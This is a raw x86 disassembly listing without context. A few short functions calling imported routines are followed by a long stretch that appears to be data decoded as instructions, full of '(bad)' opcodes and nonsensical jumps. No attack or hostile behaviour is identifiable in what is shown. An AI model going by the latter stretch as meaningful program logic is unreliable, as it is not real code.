  4d099d:	notrack call DWORD PTR ds:0x4d204c
  4d09a4:	mov    ecx,0x0
  4d09a9:	push   ecx
  4d09aa:	notrack call DWORD PTR ds:0x4d2048
  4d09b1:	add    esp,0x30
  4d09b4:	pop    ebp
  4d09b5:	ret    
  4d09b6:	add    BYTE PTR [eax],al
  4d09b8:	mov    edi,edi
  4d09ba:	push   ebp
  4d09bb:	mov    ebp,esp
  4d09bd:	sub    esp,0x60
  4d09c0:	mov    edi,0x4d302c
  4d09c5:	and    DWORD PTR [edi+0xbc],ecx
  4d09cb:	push   0x0
  4d09cd:	notrack call DWORD PTR ds:0x4d2044
  4d09d4:	push   edi
  4d09d5:	push   DWORD PTR [edi+0xc0]
  4d09db:	push   DWORD PTR [edi+0x148]
  4d09e1:	call   0x4d01dc
  4d09e6:	add    esp,0x8
  4d09e9:	pop    edi
  4d09ea:	mov    edx,0x0
  4d09ef:	push   edx
  4d09f0:	notrack call DWORD PTR ds:0x4d202c
  4d09f7:	add    esp,0x60
  4d09fa:	pop    ebp
  4d09fb:	ret    
	...
  4d0a04:	mov    edi,edi
  4d0a06:	push   ebp
  4d0a07:	mov    ebp,esp
  4d0a09:	sub    esp,0x50
  4d0a0c:	mov    edx,0x4d3140
  4d0a11:	adc    ecx,eax
  4d0a13:	push   edx
  4d0a14:	push   0x0
  4d0a16:	notrack call DWORD PTR ds:0x4d2064
  4d0a1d:	pop    edx
  4d0a1e:	push   edx
  4d0a1f:	push   ebx
  4d0a20:	push   eax
  4d0a21:	push   esi
  4d0a22:	push   DWORD PTR [edx+0x1d4]
  4d0a28:	call   0x4d0154
  4d0a2d:	add    esp,0x10
  4d0a30:	pop    edx
  4d0a31:	push   edx
  4d0a32:	push   0x0
  4d0a34:	notrack call DWORD PTR ds:0x4d2040
  4d0a3b:	pop    edx
  4d0a3c:	add    esp,0x50
  4d0a3f:	pop    ebp
  4d0a40:	ret    
	...
  4d0a49:	add    BYTE PTR [eax],al
  4d0a4b:	add    BYTE PTR [eax+edi*2-0x39],cl
  4d0a4f:	xor    eax,0x8ab7b5d6
  4d0a54:	add    eax,0x51a414d1
  4d0a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0a5a:	mov    bh,0x52
  4d0a5c:	mov    edx,0x66b75788
  4d0a61:	int3   
  4d0a62:	sub    al,0x15
  4d0a64:	je     0x4d0a56
  4d0a66:	xchg   DWORD PTR [edi+0x4e9fbed8],eax
  4d0a6c:	mov    ds:0x8aab291a,eax
  4d0a71:	loope  0x4d0a4d
  4d0a73:	int3   
  4d0a74:	dec    ebx
  4d0a75:	xchg   esi,eax
  4d0a76:	mov    dh,0xdc
  4d0a78:	xchg   ebp,eax
  4d0a79:	or     ch,bl
  4d0a7b:	mov    bl,0x20
  4d0a7d:	dec    BYTE PTR [esp+edi*1-0x75]
  4d0a81:	retf   0x64b
  4d0a84:	ror    DWORD PTR [ebx],cl
  4d0a86:	inc    ebp
  4d0a87:	and    al,BYTE PTR es:[edx]
  4d0a8a:	je     0x4d0a99
  4d0a8c:	jno    0x4d0ae8
  4d0a8e:	in     al,0x9d
  4d0a90:	pop    ecx
  4d0a91:	xchg   ebx,eax
  4d0a92:	addr16 pop esp
  4d0a94:	pop    ecx
  4d0a95:	(bad)  
  4d0a96:	cmp    DWORD PTR [esi+0x4afd45a3],edi
  4d0a9c:	dec    edx
  4d0a9d:	dec    eax
  4d0a9e:	std    
  4d0a9f:	dec    edx
  4d0aa0:	dec    ecx
  4d0aa1:	enter  0x5bc7,0x9f
  4d0aa5:	lods   eax,DWORD PTR ds:[esi]
  4d0aa6:	stos   DWORD PTR es:[edi],eax
  4d0aa7:	push   0x4cf83ac
  4d0aac:	mov    edi,0x3d549783
  4d0ab1:	sbb    DWORD PTR [esi+edi*2+0x5b],0x6
  4d0ab6:	mov    ds:0xa0decfa8,eax
  4d0abb:	jmp    0x4d0aaf
  4d0abd:	pop    edi
  4d0abe:	fdivr  DWORD PTR [ebx-0x4423200f]
  4d0ac4:	xchg   ah,dh
  4d0ac6:	xor    al,0x49
  4d0ac8:	xor    ah,0x34
  4d0acb:	adc    al,0x8
  4d0acd:	add    DWORD PTR [ebp-0x72fef8fc],ecx
  4d0ad3:	test   eax,0xa98ff3ee
  4d0ad8:	in     eax,dx
  4d0ad9:	jp     0x4d0aa4
  4d0adb:	push   ebp
  4d0adc:	push   cs
  4d0add:	(bad)  
  4d0ade:	mov    ds:0xcfce6536,eax
  4d0ae3:	pop    edx
  4d0ae4:	or     DWORD PTR [esi-0x2998c079],esp
  4d0aea:	shr    DWORD PTR [edi+edx*4-0x7d],cl
  4d0aee:	frstpm(287 only) 
  4d0af0:	nop
  4d0af1:	jmp    0x9c2298d1
  4d0af6:	mov    esi,0xdbd3bce8
  4d0afb:	mov    ebx,ecx
  4d0afd:	xchg   DWORD PTR [eax+0x18f9d76],ecx
  4d0b03:	xor    BYTE PTR [eax-0xed73af4],bl
  4d0b09:	dec    esp
  4d0b0a:	lods   eax,DWORD PTR ds:[esi]
  4d0b0b:	sub    al,ah
  4d0b0d:	dec    esp
  4d0b0e:	lods   eax,DWORD PTR ds:[esi]
  4d0b0f:	inc    eax
  4d0b10:	inc    ebx
  4d0b11:	dec    edx
  4d0b12:	lods   eax,DWORD PTR ds:[esi]
  4d0b13:	inc    eax
  4d0b14:	sub    BYTE PTR [edx+0x52],cl
  4d0b17:	adc    eax,0x10aac137
  4d0b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0b1d:	shr    DWORD PTR [edx+0x1f4cf610],0xc0
  4d0b24:	push   cs
  4d0b25:	mov    bl,0xe0
  4d0b27:	jns    0x4d0ad2
  4d0b29:	mov    ch,0xe0
  4d0b2b:	jns    0x4d0b86
  4d0b2d:	adc    DWORD PTR [ebx],esp
  4d0b2f:	xchg   ecx,eax
  4d0b30:	iret   
  4d0b31:	adc    al,0x23
  4d0b33:	xchg   ecx,eax
  4d0b34:	xchg   ecx,eax
  4d0b35:	dec    edx
  4d0b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0b38:	mov    ah,0x1c
  4d0b3a:	dec    esp
  4d0b3b:	pop    esp
  4d0b3c:	scas   eax,DWORD PTR es:[edi]
  4d0b3d:	sbb    al,0x4c
  4d0b3f:	mov    ah,0x97
  4d0b41:	sbb    DWORD PTR [esp+esi*4+0x1b],ecx
  4d0b45:	loope  0x4d0b6d
  4d0b47:	mov    ah,0x70
  4d0b49:	loope  0x4d0b24
  4d0b4b:	rcl    DWORD PTR [ebx],0xb6
  4d0b4e:	es xchg esp,eax
  4d0b50:	cmp    bh,BYTE PTR ds:0x3d4ffc6b
  4d0b56:	aas    
  4d0b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0b58:	scas   eax,DWORD PTR es:[edi]
  4d0b59:	or     DWORD PTR [ebx],ebx
  4d0b5b:	hlt    
  4d0b5c:	std    
  4d0b5d:	pop    edi
  4d0b5e:	dec    esp
  4d0b5f:	or     esp,DWORD PTR [edi+0x575c1473]
  4d0b65:	es or  al,0xb4
  4d0b68:	jge    0x4d0b8f
  4d0b6a:	or     al,0xb4
  4d0b6c:	cmc    
  4d0b6d:	arpl   WORD PTR [eax],si
  4d0b6f:	cmp    eax,esi
  4d0b71:	gs push esi
  4d0b73:	into   
  4d0b74:	scas   eax,DWORD PTR es:[edi]
  4d0b75:	jae    0x4d0bcd
  4d0b77:	out    dx,al
  4d0b78:	fldenv [ebp+0x6f]
  4d0b7b:	mov    dh,0xec
  4d0b7d:	adc    DWORD PTR [esi+0x3d],edi
  4d0b80:	mov    bl,0x25
  4d0b82:	adc    al,0x39
  4d0b84:	fisub  DWORD PTR ds:0xdad93924
  4d0b8a:	push   esp
  4d0b8b:	imul   ecx,DWORD PTR [ecx+0x1790125],0x54296d58
  4d0b95:	xor    ch,BYTE PTR [ecx+0x7e]
  4d0b98:	push   es
  4d0b99:	int    0x3c
  4d0b9b:	jb     0x4d0bee
  4d0b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0b9e:	ds and eax,0xeab5f101
  4d0ba4:	mov    DWORD PTR [edx],ecx
  4d0ba6:	inc    esi
  4d0ba7:	dec    esi
  4d0ba8:	(bad)  
  4d0ba9:	cmc    
  4d0baa:	adc    eax,DWORD PTR [edx-0x73]
  4d0bad:	jle    0x4d0b8c
  4d0baf:	inc    ecx
  4d0bb0:	ret    
  4d0bb1:	inc    edx
  4d0bb2:	push   eax
  4d0bb3:	cmp    dl,bl
  4d0bb5:	leave  
  4d0bb6:	pop    es
  4d0bb7:	sbb    ah,dl
  4d0bb9:	jle    0x4d0c01
  4d0bbb:	or     al,0xd6
  4d0bbd:	xchg   BYTE PTR [ecx-0x45],cl
  4d0bc0:	sahf   
  4d0bc1:	sub    BYTE PTR [ecx],0x30
  4d0bc4:	fcom   DWORD PTR [esp+ebp*4+0x27d5abf0]
  4d0bcb:	mov    bh,0xa2
  4d0bcd:	push   eax
  4d0bce:	out    0xc3,eax
  4d0bd0:	xchg   edi,eax
  4d0bd1:	mov    eax,0xb896c776
  4d0bd6:	std    
  4d0bd7:	nop    edi
  4d0bda:	(bad)  
  4d0bdc:	push   0x6ae7d9fd
  4d0be1:	mov    cl,ch
  4d0be3:	sbb    BYTE PTR [edx+ebx*4],bl
  4d0be6:	inc    esi
  4d0be7:	setns  BYTE PTR [di+0x5e3c]
  4d0bed:	adc    ch,BYTE PTR [ecx+0x6e]
  4d0bf0:	or     eax,0x5e3f3e43
  4d0bf5:	sub    DWORD PTR [edx],edi
  4d0bf7:	outs   dx,BYTE PTR ds:[esi]
  4d0bf8:	or     dh,dl
  4d0bfa:	outs   dx,DWORD PTR ds:[esi]
  4d0bfb:	bound  edx,QWORD PTR [eax-0x1b]
  4d0bfe:	scas   eax,DWORD PTR es:[edi]
  4d0bff:	xor    eax,0xbef04fa2
  4d0c04:	push   0x3c4154bc
  4d0c09:	mov    al,0xc
  4d0c0b:	and    BYTE PTR [esi+0xec22477],bh
  4d0c11:	lahf   
  4d0c12:	das    
  4d0c13:	ret    
  4d0c14:	or     eax,0xc42c79f
  4d0c19:	lahf   
  4d0c1a:	(bad)  
  4d0c1b:	sbb    ah,BYTE PTR [ebx-0x61]
  4d0c1e:	xchg   DWORD PTR [edx],ebx
  4d0c20:	bound  esp,QWORD PTR [eax-0xe]
  4d0c23:	jb     0x4d0c58
  4d0c25:	jmp    0x4d0c30
  4d0c27:	stc    
  4d0c28:	ret    0x303
  4d0c2b:	std    
  4d0c2c:	rol    DWORD PTR [ebx],0x67
  4d0c2f:	add    dh,bl
  4d0c31:	xor    esp,DWORD PTR [edi+0x2]
  4d0c34:	repnz imul ebp,esp,0x42
  4d0c38:	std    
  4d0c39:	loopne 0x4d0be7
  4d0c3b:	dec    esi
  4d0c3c:	ret    
  4d0c3d:	mov    eax,0x33c63ab4
  4d0c42:	mov    ah,0xd1
  4d0c44:	xor    BYTE PTR [eax-0xecd0a48],bh
  4d0c4a:	test   BYTE PTR [esi+0x42],bh
  4d0c4d:	fld    DWORD PTR [edi-0x605e3577]
  4d0c53:	add    BYTE PTR [ecx-0x8080643],bh
  4d0c59:	stos   DWORD PTR es:[edi],eax
  4d0c5a:	stc    
  4d0c5b:	xlat   BYTE PTR ds:[ebx]
  4d0c5c:	and    DWORD PTR [edi-0x58678963],0xe712769d
  4d0c66:	lods   eax,DWORD PTR ds:[esi]
  4d0c67:	jmp    FWORD PTR [ecx-0x11]
  4d0c6a:	push   edx
  4d0c6b:	stos   BYTE PTR es:[edi],al
  4d0c6c:	jl     0x4d0c75
  4d0c6e:	and    al,0xa8
  4d0c70:	jnp    0x4d0c79
  4d0c72:	jns    0x4d0cd5
  4d0c74:	and    cl,BYTE PTR [esi-0x10c2baf3]
  4d0c7a:	pop    ebp
  4d0c7b:	lods   eax,DWORD PTR ds:[esi]
  4d0c7c:	(bad)  
  4d0c7d:	jmp    0xf525:0x6ba6ad5d
  4d0c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0c85:	imul   esp,DWORD PTR ds:0xae66cff5,0xaaa1eaf1
  4d0c8f:	aad    0xe9
  4d0c91:	mov    eax,ds:0xd515d5aa
  4d0c96:	mov    ss,ecx
  4d0c98:	inc    esp
  4d0c99:	out    0x4e,al
  4d0c9b:	adc    ah,BYTE PTR [ebx]
  4d0c9d:	ins    DWORD PTR es:[edi],dx
  4d0c9e:	mov    ebp,0x36515411
  4d0ca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0ca4:	rcl    DWORD PTR [ecx+0x36],cl
  4d0ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0ca8:	push   ebp
  4d0ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0caa:	inc    edx
  4d0cab:	aam    0x55
  4d0cad:	push   esp
  4d0cae:	leave  
  4d0caf:	stos   BYTE PTR es:[edi],al
  4d0cb0:	pop    eax
  4d0cb1:	shl    DWORD PTR [esi],1
  4d0cb3:	fidiv  WORD PTR [ecx]
  4d0cb5:	ror    ch,cl
  4d0cb7:	mov    ebp,ecx
  4d0cb9:	xchg   ecx,ecx
  4d0cbb:	or     al,0xc
  4d0cbd:	repnz int 0x5b
  4d0cc0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0cc2:	int    0xb
  4d0cc4:	mov    ds:0x9f1bbb2c,eax
  4d0cc9:	fbstp  TBYTE PTR [eax]
  4d0ccb:	in     eax,0x31
  4d0ccd:	pop    edx
  4d0cce:	lock nop
  4d0cd0:	leave  
  4d0cd1:	jno    0x4d0cda
  4d0cd3:	sbb    eax,DWORD PTR [esi]
  4d0cd5:	das    
  4d0cd6:	push   esi
  4d0cd7:	dec    ebx
  4d0cd8:	push   ecx
  4d0cd9:	inc    ebp
  4d0cda:	push   edx
  4d0cdb:	sbb    al,BYTE PTR ds:0x521607ba
  4d0ce1:	xor    DWORD PTR [ecx],eax
  4d0ce3:	xchg   ebx,eax
  4d0ce4:	xchg   ecx,eax
  4d0ce5:	mov    eax,ds:0xb1d61891
  4d0cea:	sbb    al,0x2c
  4d0cec:	aam    0xe6
  4d0cee:	mov    cl,0xa9
  4d0cf0:	adc    edx,DWORD PTR [edx-0x6dedff56]
  4d0cf6:	stos   BYTE PTR es:[edi],al
  4d0cf7:	and    BYTE PTR [esi-0x6a],0x27
  4d0cfb:	les    esp,FWORD PTR [esp+edx*4+0x2]
  4d0cff:	cmp    ebx,DWORD PTR [edx+0x646b7d6b]
  4d0d05:	pop    ds
  4d0d06:	pop    ecx
  4d0d07:	jg     0x4d0ca3
  4d0d09:	dec    edx
  4d0d0a:	push   ecx
  4d0d0b:	aam    0x70
  4d0d0d:	stos   BYTE PTR es:[edi],al
  4d0d0e:	push   cs
  4d0d0f:	mov    ah,BYTE PTR [edi]
  4d0d11:	repz pop edx
  4d0d13:	fidiv  DWORD PTR [ebp-0x5c]
  4d0d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0d17:	(bad)  
  4d0d18:	js     0x4d0d16
  4d0d1a:	es dec ecx
  4d0d1c:	imul   edx,DWORD PTR [edi],0xffffffa9
  4d0d1f:	sub    BYTE PTR [edi+0x2bfb2277],ah
  4d0d25:	test   DWORD PTR [ecx],esp
  4d0d27:	lea    edx,[esi]
  4d0d29:	scas   al,BYTE PTR es:[edi]
  4d0d2a:	ja     0x4d0ce5
  4d0d2c:	xchg   edx,eax
  4d0d2d:	jl     0x4d0da7
  4d0d2f:	cmp    eax,0x3d787c06
  4d0d34:	mov    edx,?
  4d0d36:	fdivr  QWORD PTR ds:0x8b57f28b
  4d0d3c:	sub    dh,dl
  4d0d3e:	push   edi
  4d0d3f:	mov    ebp,DWORD PTR [esi+0x2e0f5804]
  4d0d45:	add    al,0x58
  4d0d47:	cvttps2pi mm6,xmm7
  4d0d4a:	cmc    
  4d0d4b:	test   bl,dl
  4d0d4d:	hlt    
  4d0d4e:	push   cs
  4d0d4f:	aam    0x57
  4d0d51:	xor    BYTE PTR [esi-0x7b],bl
  4d0d54:	add    al,0x60
  4d0d56:	xor    al,0x81
  4d0d58:	imul   esp,DWORD PTR [eax+0x24],0xffffff81
  4d0d5c:	push   0x37
  4d0d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0d5f:	imul   ebp,DWORD PTR [ebp+0x67],0x67046dcd
  4d0d66:	(bad)  [ebp+0x3]
  4d0d69:	xor    BYTE PTR [ecx+ebp*2+0x26],bl
  4d0d6d:	xor    BYTE PTR [ecx+ebp*2+0x25],cl
  4d0d71:	iret   
  4d0d72:	sbb    DWORD PTR [ebp-0x27],esp
  4d0d75:	call   0xf73e:0x377f3f15
  4d0d7c:	sub    eax,0xc326f6bc
  4d0d81:	aas    
  4d0d82:	pop    ds
  4d0d83:	and    ch,bh
  4d0d85:	(bad)  
  4d0d86:	jns    0x4d0d17
  4d0d88:	mov    BYTE PTR [esi+0x79],dl
  4d0d8b:	mov    edi,0x405c5efb
  4d0d90:	repz pop esi
  4d0d92:	pop    esp
  4d0d93:	inc    ecx
  4d0d94:	out    0x59,al
  4d0d96:	mov    esi,0xfad4beaf
  4d0d9b:	mov    edi,DWORD PTR [ecx+0x45dba885]
  4d0da1:	mov    ch,0xc0
  4d0da3:	fist   DWORD PTR [ebp+esi*4-0x40]
  4d0da7:	mov    esi,ss
  4d0da9:	pop    ebp
  4d0daa:	(bad)  
  4d0dab:	fsubr  QWORD PTR [eax]
  4d0dad:	ins    DWORD PTR es:[edi],dx
  4d0dae:	lods   al,BYTE PTR ds:[esi]
  4d0daf:	fdiv   QWORD PTR [edi]
  4d0db1:	ins    DWORD PTR es:[edi],dx
  4d0db2:	lods   al,BYTE PTR ds:[esi]
  4d0db3:	mov    esi,DWORD PTR [ebp-0x5b747797]
  4d0db9:	imul   ecx,DWORD PTR [eax+0x7765f074],0x2e3ffb21
  4d0dc3:	jns    0x4d0d67
  4d0dc5:	mov    edx,0xdb220ce7
  4d0dca:	and    al,0x6c
  4d0dcc:	enter  0x89dc,0x8e
  4d0dd0:	xor    al,0x51
  4d0dd2:	mov    ebp,0x55daf68d
  4d0dd7:	push   es
  4d0dd8:	add    al,0x63
  4d0dda:	inc    ebp
  4d0ddb:	push   es
  4d0ddc:	add    esp,DWORD PTR [ebx-0x53]
  4d0ddf:	in     eax,dx
  4d0de0:	sti    
  4d0de1:	pushf  
  4d0de2:	push   edx
  4d0de3:	push   esp
  4d0de4:	jecxz  0x4d0d82
  4d0de6:	push   edx
  4d0de7:	push   esp
  4d0de8:	or     bh,BYTE PTR [ebp-0x53]
  4d0deb:	stos   DWORD PTR es:[edi],eax
  4d0dec:	hlt    
  4d0ded:	sub    edx,DWORD PTR [esp+ebp*4]
  4d0df0:	repz sub edx,DWORD PTR [esp+eax*2]
  4d0df4:	and    al,0xd4
  4d0df6:	jmp    0x4d0db3
  4d0df8:	scas   al,BYTE PTR es:[edi]
  4d0df9:	add    al,0x60
  4d0dfb:	(bad)
  4d0dff:	(bad)
  4d0e03:	dec    eax
  4d0e04:	jbe    0x4d0e48
  4d0e06:	jle    0x4d0dcb
  4d0e08:	xchg   ecx,ecx
  4d0e0a:	mov    ah,0x2b
  4d0e0c:	cmp    BYTE PTR [esi],dh
  4d0e0e:	dec    ebx
  4d0e0f:	aam    0xa
  4d0e11:	neg    BYTE PTR [ebx]
  4d0e13:	adc    eax,0x11daf1c1
  4d0e18:	in     al,0xfc
  4d0e1a:	fist   DWORD PTR ds:0xd55f50bf
  4d0e20:	leave  
  4d0e21:	mov    eax,ds:0x9a3d5e07
  4d0e26:	ret    0x3d2a
  4d0e29:	shl    BYTE PTR [edi-0x6c1b4a09],1
  4d0e2f:	dec    esi
  4d0e30:	mov    esi,0x554e93e4
  4d0e35:	jno    0x4d0ea3
  4d0e37:	mov    cl,0xa9
  4d0e39:	jle    0x4d0e16
  4d0e3b:	mov    ebp,0x48a20fe
  4d0e40:	cmc    
  4d0e41:	and    BYTE PTR [edx+0x75a51c04],cl
  4d0e47:	sti    
  4d0e48:	loop   0x4d0e46
  4d0e4a:	popf   
  4d0e4b:	test   BYTE PTR [ebx+eax*1],bl
  4d0e4e:	bound  ecx,QWORD PTR ds:0x6c7e2767
  4d0e54:	mov    ds:0xbd84bf76,eax
  4d0e59:	iret   
  4d0e5a:	lahf   
  4d0e5b:	test   BYTE PTR [edi+ecx*8+0x768bf0d7],bh
  4d0e62:	aad    0xf0
  4d0e64:	mov    dh,BYTE PTR [esi-0x63]
  4d0e67:	test   BYTE PTR [ecx-0x5f7b4231],ah
  4d0e6d:	iret   
  4d0e6e:	cmc    
  4d0e6f:	lock jg 0x4d0ee8
  4d0e72:	icebp  
  4d0e73:	lock jle 0x4d0eec
  4d0e76:	mov    ecx,0xf9cf6584
  4d0e7b:	test   BYTE PTR [edi+ecx*8-0x4f],ah
  4d0e7f:	lock jae 0x4d0ef8
  4d0e82:	mov    ch,0xf0
  4d0e84:	jb     0x4d0efc
  4d0e86:	std    
  4d0e87:	test   BYTE PTR [ecx-0x31],bh
  4d0e8a:	mov    ebp,0xf5cf7884
  4d0e8f:	lock ja 0x4d0ed6
  4d0e92:	xor    al,0xa9
  4d0e94:	mov    bl,0x24
  4d0e96:	mov    edi,0x4da5c2fc
  4d0e9b:	ins    DWORD PTR es:[edi],dx
  4d0e9c:	daa    
  4d0e9d:	loopne 0x4d0ed4
  4d0e9f:	out    0x69,al
  4d0ea1:	mov    BYTE PTR [esi-0x190a16e8],bh
  4d0ea7:	sbb    BYTE PTR [esi+esi*8+0x7dc36de7],bl
  4d0eae:	mov    ds:0xd6bd450d,al
  4d0eb3:	sbb    bl,cl
  4d0eb5:	sti    
  4d0eb6:	jmp    0x6f4a:0xeaff704a
  4d0ebd:	pop    ss
  4d0ebe:	dec    edi
  4d0ebf:	dec    ebx
  4d0ec0:	outs   dx,BYTE PTR ds:[esi]
  4d0ec1:	pop    ss
  4d0ec2:	adc    eax,0xed149d48
  4d0ec7:	arpl   WORD PTR [edi+ebp*1-0x68],dx
  4d0ecb:	cmp    esp,DWORD PTR [eax]
  4d0ecd:	and    bl,BYTE PTR [ebx-0x19de84b2]
  4d0ed3:	adc    cl,BYTE PTR [edi+0x6c]
  4d0ed6:	mov    edx,0xb1188597
  4d0edb:	cmp    dl,ah
  4d0edd:	sub    esi,DWORD PTR [ebx+0x60]
  4d0ee0:	jle    0x4d0e8a
  4d0ee2:	call   0xfaa0:0xfb4b9b63
  4d0ee9:	enter  0xec86,0xf9
  4d0eed:	mov    esp,0xbcf50494
  4d0ef2:	xchg   esp,eax
  4d0ef3:	add    al,0x7d
  4d0ef5:	rol    eax,0x81
  4d0ef8:	xor    DWORD PTR [ebp+0x16682ac6],0x77672ac6
  4d0f02:	add    eax,0x3922974a
  4d0f07:	ror    DWORD PTR [esi-0x57],0x4c
  4d0f0b:	(bad)  
  4d0f0c:	(bad)  
  4d0f0d:	in     al,dx
  4d0f0e:	sbb    al,0xdd
  4d0f10:	xchg   ebx,eax
  4d0f11:	test   BYTE PTR [ebx*8+0x224f849e],bl
  4d0f18:	retf   0x16c4
  4d0f1b:	jb     0x4d0f5d
  4d0f1d:	cmp    al,0xe5
  4d0f1f:	(bad)  
  4d0f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0f21:	add    al,0xe5
  4d0f23:	(bad)  
  4d0f24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0f25:	dec    esp
  4d0f26:	ins    BYTE PTR es:[edi],dx
  4d0f27:	xchg   edx,eax
  4d0f28:	sub    DWORD PTR [edi+eiz*8+0x6a],0x6e5a600b
  4d0f30:	or     ah,BYTE PTR [eax+0x5a]
  4d0f33:	or     ch,BYTE PTR [edx-0x56f5a588]
  4d0f39:	repz sub ah,BYTE PTR [esi]
  4d0f3c:	neg    DWORD PTR [ebx-0x6405d9d6]
  4d0f42:	jns    0x4d0f1d
  4d0f44:	scas   al,BYTE PTR es:[edi]
  4d0f45:	fcomi  st,st(4)
  4d0f47:	aad    0x15
  4d0f49:	push   esp
  4d0f4a:	cmc    
  4d0f4b:	test   DWORD PTR [ebp+0x6d7d7e9b],ebx
  4d0f51:	ds sbb bl,ah
  4d0f54:	je     0x4d0f94
  4d0f56:	sbb    bl,ah
  4d0f58:	cli    
  4d0f59:	jle    0x4d0f91
  4d0f5b:	mov    ebp,0x51b71e38
  4d0f60:	pop    ss
  4d0f61:	sbb    al,0xb7
  4d0f63:	push   ecx
  4d0f64:	jle    0x4d0f9e
  4d0f66:	mov    ch,0x51
  4d0f68:	jge    0x4d0f75
  4d0f6a:	inc    ebx
  4d0f6b:	cmp    edi,DWORD PTR [ecx+eiz*2+0x4b]
  4d0f6f:	les    ebp,FWORD PTR [eax]
  4d0f71:	jge    0x4d0f33
  4d0f73:	sbb    al,0x7b
  4d0f75:	cs aas 
  4d0f77:	dec    ecx
  4d0f78:	dec    esi
  4d0f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0f7a:	jnp    0x4d0fe9
  4d0f7c:	push   ecx
  4d0f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0f7e:	cmp    edx,DWORD PTR [ecx-0x27]
  4d0f81:	es sti 
  4d0f83:	push   ecx
  4d0f84:	fsub   DWORD PTR [esi]
  4d0f86:	jle    0x4d0f19
  4d0f88:	stos   DWORD PTR es:[edi],eax
  4d0f89:	daa    
  4d0f8a:	cmp    ch,al
  4d0f8c:	neg    eax
  4d0f8e:	ins    DWORD PTR es:[edi],dx
  4d0f8f:	std    
  4d0f90:	jno    0x4d0faa
  4d0f92:	sbb    BYTE PTR [eax],bl
  4d0f94:	and    edi,esp
  4d0f96:	dec    ebp
  4d0f97:	add    BYTE PTR [edi-0x61fd96dd],bl
  4d0f9d:	and    esp,eax
  4d0f9f:	jbe    0x4d0f5a
  4d0fa1:	aas    
  4d0fa2:	xor    DWORD PTR [ebp-0x2612a828],0xab8557d7
  4d0fac:	mov    ds:0xcec3e179,al
  4d0fb1:	or     dl,BYTE PTR [edi-0x3d0a6660]
  4d0fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0fb8:	sbb    esi,DWORD PTR ds:0xca4eacb7
  4d0fbe:	loop   0x4d0f6c
  4d0fc0:	retf   0x960a
  4d0fc3:	loope  0x4d0f64
  4d0fc5:	or     bh,dh
  4d0fc7:	mov    al,dh
  4d0fc9:	jle    0x4d0f63
  4d0fcb:	loopne 0x4d0f62
  4d0fcd:	or     eax,ebp
  4d0fcf:	xchg   edx,eax
  4d0fd0:	rcr    BYTE PTR [ecx+0x17],0xc7
  4d0fd4:	(bad)  
  4d0fd5:	fcmovbe st,st(3)
  4d0fd7:	retf   
  4d0fd8:	dec    ebx
  4d0fd9:	sub    al,BYTE PTR [ebx-0x1695df61]
  4d0fdf:	cwde   
  4d0fe0:	jne    0x4d0f77
  4d0fe2:	mov    esp,0xe8c52c94
  4d0fe7:	les    eax,FWORD PTR [ebp-0x3e]
  4d0fea:	mov    esi,0xbec2622c
  4d0fef:	sub    al,0xe8
  4d0ff1:	(bad)  
  4d0ff2:	call   0x2dad:0x9aec2ead
  4d0ff9:	xchg   BYTE PTR [ebp-0x25dd220c],bl
  4d0fff:	jg     0x4d101b
  4d1001:	mov    DWORD PTR [edi+0x1],edx
  4d1004:	loop   0x4d103f
  4d1006:	aas    
  4d1007:	stos   DWORD PTR es:[edi],eax
  4d1008:	mov    ecx,0x12688f92
  4d100d:	ins    DWORD PTR es:[edi],dx
  4d100e:	fisub  DWORD PTR [ecx+ecx*2-0x12]
  4d1012:	push   ds
  4d1013:	push   0x97462d27
  4d1018:	idiv   BYTE PTR [eax-0x52]
  4d101b:	or     ebp,esi
  4d101d:	js     0x4d0fcd
  4d101f:	push   esp
  4d1020:	ja     0x4d105f
  4d1022:	(bad)  
  4d1024:	mov    dh,0x39
  4d1026:	push   edi
  4d1027:	xchg   ebx,eax
  4d1028:	xchg   ecx,eax
  4d1029:	sub    DWORD PTR [edx],ecx
  4d102b:	xchg   ebx,eax
  4d102c:	nop
  4d102d:	sub    DWORD PTR [edx],ecx
  4d102f:	xchg   ebx,eax
  4d1030:	vprotq xmm9,[esi-0x18af9dd7],xmm3
  4d1039:	sbb    dl,BYTE PTR [esi+esi*1+0x50ce575c]
  4d1040:	lock xor ebp,edi
  4d1043:	add    BYTE PTR [ebx-0x7f9183c7],0x29
  4d104a:	jl     0x4d10ba
  4d104c:	push   0xffffffc4
  4d104e:	icebp  
  4d104f:	xor    BYTE PTR [ebx+0x61450e40],dl
  4d1055:	retf   
  4d1056:	js     0x4d10d7
  4d1058:	push   es
  4d1059:	jno    0x4d1083
  4d105b:	cmp    cl,BYTE PTR [edx+0x265c3645]
  4d1061:	and    eax,DWORD PTR ds:0xc6c3528c
  4d1067:	frstor [eax+0xa]
  4d106a:	xchg   esi,esi
  4d106c:	mov    eax,ds:0xa2828372
  4d1071:	cdq    
  4d1072:	je     0x4d1025
  4d1074:	popa   
  4d1075:	call   0xd875:0xc39c53b6
  4d107c:	loopne 0x4d1029
  4d107e:	pop    ds
  4d107f:	fadd   QWORD PTR [edi-0x7923f055]
  4d1085:	cld    
  4d1086:	fdivr  QWORD PTR gs:[eax-0x57]
  4d108a:	jne    0x4d10e3
  4d108c:	xchg   DWORD PTR [eax],ebp
  4d108e:	cdq    
  4d108f:	push   ebx
  4d1090:	test   DWORD PTR [eax],ebp
  4d1092:	cdq    
